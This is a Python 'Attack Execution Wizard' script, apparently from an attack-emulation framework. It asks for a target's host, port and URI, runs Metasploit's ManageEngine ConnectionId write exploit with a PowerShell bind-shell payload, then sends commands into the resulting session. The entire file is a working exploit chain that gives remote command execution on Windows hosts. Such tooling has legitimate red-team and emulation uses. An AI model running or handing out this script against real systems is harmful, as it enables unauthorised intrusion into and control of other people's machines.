
import asyncio
import questionary
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.exploit.Metasploit import MetasploitExecutor

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: RHOSTS[/]")
    console.print(f"  Description: ")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for RHOSTS [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: RHOSTS")
    user_params["RHOSTS"] = user_input

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: RPORT[/]")
    console.print(f"  Description: ")
    default_val = "8020"
    user_input = console.input(
        f"[bold]➤ Enter value for RPORT [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: RPORT")
    user_params["RPORT"] = user_input

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: TARGETURI[/]")
    console.print(f"  Description: ")
    default_val = "/"
    user_input = console.input(
        f"[bold]➤ Enter value for TARGETURI [default: {default_val}]: [/]"
    ) or default_val
    user_input = user_input.strip("/")
    if not user_input and True:
        raise ValueError("Missing required parameter: TARGETURI")
    user_params["TARGETURI"] = user_input

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 2 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: ")
    default_val = "4444"
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    # Metasploit configuration
    with console.status("[bold green]Configuring Metasploit payload..."):
        metasploit_executor = MetasploitExecutor(config=config)
        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="windows/http/manageengine_connectionid_write",
            payload_module_name="windows/powershell_bind_tcp",
            RHOSTS=user_params["RHOSTS"], RPORT=user_params["RPORT"], TARGETURI=user_params["TARGETURI"], LPORT=user_params["LPORT"]
    )
    metasploit_sessionid = metasploit_executor.select_session(
    )

    confirm_action()

    metasploit_sessionid = metasploit_executor.select_session()
    commands = """
    Get-Process
    """
    metasploit_executor.communicate_with_msf_session(session_id=metasploit_sessionid,input_texts=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
